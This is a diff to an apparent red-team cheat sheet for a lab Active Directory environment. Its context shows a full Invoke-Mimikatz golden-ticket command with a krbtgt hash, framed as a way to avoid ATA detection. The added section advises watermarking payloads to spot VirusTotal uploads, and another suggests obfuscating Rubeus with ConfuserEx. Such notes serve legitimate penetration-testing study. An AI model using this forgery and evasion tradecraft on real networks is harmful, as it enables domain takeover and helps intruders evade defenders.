@@ -1230,6 +1230,10 @@ Once again, we require the trust key for the inter-forest trust.
 - If we forge a Golden Ticket with SID History of the Domain Controllers group and Enterprise Domain Controllers Group, there are fewer chances of detection by ATA:
   `Invoke-Mimikatz -Command '"kerberos::golden /user:dcorp-dc$ /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /groups:516 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ptt"'`
 
+## Check if you are caught
+- **If you have VirusTotal Enterprise subscription you can use watermarking in your payloads and then Search to see if your payloads are being upload to VT, for example :
+content: "malware-development- test-123456789-0987654321"
+
 ## Obfuscation
 - **Obfuscation:** For Rubeus.exe, use ConfuserEx ([ConfuserEx](https://github.com/mkaring/ConfuserEx)) to obfuscate the binary.
 
